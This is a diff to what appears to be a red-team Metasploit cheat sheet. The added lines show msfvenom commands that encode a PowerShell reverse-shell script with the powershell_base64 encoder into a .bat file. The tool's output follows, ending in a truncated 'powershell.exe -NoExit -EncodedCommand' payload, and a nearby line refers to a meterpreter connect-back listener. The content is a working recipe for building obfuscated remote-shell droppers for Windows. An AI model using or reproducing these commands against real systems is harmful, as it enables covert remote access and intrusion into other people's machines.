@@ -6,6 +6,24 @@ Metasploit
 #Start Metasploit
 sudo msfconsole 
 
+#msfvenom list encoders
+#add base64 powershell 
+#/opt/metasploit/modules/encoders/powershell/powershell_base64.rb
+msfvenom --list encoders
+
+powershell/powershell_base64  normal     Powershell Base64 Script Encoder
+
+
+#use powershell online shell script in ps_shell.ps1
+cat ps_shell.ps1 | msfvenom --payload - --platform win --arch x86 --encoder powershell/powershell_base64 NOEXIT SYSWOW64 --out test.bat
+
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of powershell/powershell_base64
+powershell/powershell_base64 succeeded with size 1367 (iteration=0)
+powershell/powershell_base64 chosen with final size 1367
+Payload size: 1367 bytes
+c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoExit -EncodedCommand  JABjAGwAaQBlA..........
 
 
 #Opens meterpreter connect back listener on the RedTeam (Attacker)
